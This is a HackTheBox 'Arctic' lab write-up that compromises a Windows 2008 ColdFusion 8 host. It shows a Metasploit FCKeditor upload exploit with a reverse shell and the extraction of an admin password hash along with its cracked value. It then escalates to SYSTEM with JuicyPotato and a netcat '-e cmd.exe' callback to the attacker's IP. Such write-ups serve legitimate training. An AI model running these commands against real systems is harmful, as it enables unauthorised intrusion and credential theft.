# Arctic | HackTheBox

### 1. Scan
```bash
┌─[htb-jib1337@htb-zdixutvzmf]─[~]
└──╼ $sudo nmap -A -p- -T4 10.129.112.21
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-05 04:01 UTC
Nmap scan report for 10.129.112.21
Host is up (0.18s latency).
Not shown: 65532 filtered ports
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   183.63 ms 10.10.14.1
2   183.78 ms 10.129.112.21

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 304.33 seconds
```
The machine is Windows, and only has port 8500 open aside from RPC ports 135 adn 49154. 8500 is known to be commonly used for Adobe Coldfusion.

### 2. Enumerate
From a browser, the ColdFusion admin interface login page is found at: http://10.129.112.21:8500/CFIDE/administrator/.  
There are also a number of files readable from the index, including coldfusion documentation. From here, and additionally from reading other files in the web server index, note the version of CF is MX8. There is potential for a arbritary file upload here through upload.cfm.

### 3. Get a shell
There is a metasploit module for this but it won't work out the box as the server is very slow to respond to requests. Need to increase the timeout.
```bash
msf6 exploit(windows/http/coldfusion_fckeditor) > set HttpClientTimeout 1000
HttpClientTimeout => 1000.0
msf6 exploit(windows/http/coldfusion_fckeditor) > options

Module options (exploit/windows/http/coldfusion_fckeditor):

   Name           Current Setting                                                Required  Description
   ----           ---------------                                                --------  -----------
   FCKEDITOR_DIR  /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/c  no        The path to upload.cfm
                  fm/upload.cfm
   Proxies                                                                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS         10.129.112.21                                                  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          8500                                                           yes       The target port (TCP)
   SSL            false                                                          no        Negotiate SSL/TLS for outgoing connections
   VHOST                                                                         no        HTTP server virtual host


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.2       yes       The listen address (an interface may be specified)
   LPORT  9999             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Universal Windows Target


msf6 exploit(windows/http/coldfusion_fckeditor) > run

[*] Started reverse TCP handler on 10.10.14.2:9999 
[*] Sending our POST request...
[*] Upload succeeded! Executing payload...
[*] Command shell session 1 opened (10.10.14.2:9999 -> 10.129.112.21:49380) at 2021-06-05 04:51:05 +0000

C:\ColdFusion8\runtime\bin>whoami
arctic\tolis
```

### 3. Get the ColdFusion password
The big first thing to do once getting a shell is to pull the coldfusion admin password from password.properties. This is where the hashed password is kept.
```bash
C:\ColdFusion8\lib>type password.properties
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
```
This password cracks online to `happyday`.

### 4. Enumerate from user
Ran systeminfo.
```shell
C:\>systeminfo

Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84451
Original Install Date:     22/3/2017, 11:09:45 ��
System Boot Time:          6/6/2021, 2:57:31 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     1.023 MB
Available Physical Memory: 297 MB
Virtual Memory: Max Size:  2.047 MB
Virtual Memory: Available: 1.203 MB
Virtual Memory: In Use:    844 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.112.21
                                 [02]: fe80::3969:bb8b:7a7b:e953
                                 [03]: dead:beef::3969:bb8b:7a7b:e953
```
The machine is an unpatched Windows 2008 Server. There's going to be a lot of vulnerabilities.
Additionally it looks like the current user has the SeImpersonate Privilege.
```bash
C:\Windows\Temp>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

### 5. Prepare an exploit
To abuse the SeImpersonatePrivilage, use RottenPotato. Copy the nessecary files to the machine over SMB. The exploit will leverage a COM object to run a command as SYSTEM. In this case it will run netcat and connect back to the attacker machine.
```shell
C:\Windows\Temp>copy \\10.10.14.2\share\JuicyPotato.exe .\jp.exe
        1 file(s) copied.

C:\Windows\Temp>copy \\10.10.14.2\share\nc64.exe .\nc.exe
        1 file(s) copied.
```

### 6. Escalate to SYSTEM
Run the binary with the nessecary arguments.
```shell
C:\Windows\Temp>.\jp.exe -l 1337 -p C:\windows\system32\cmd.exe -a "/c C:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.2 9998" -t *
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```
Catch the shell in a listener.
```shell
┌─[htb-jib1337@htb-zdixutvzmf]─[~/smb]
└──╼ $nc -lvnp 9998
Listening on 0.0.0.0 9998
Connection received on 10.129.61.22 49200
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```
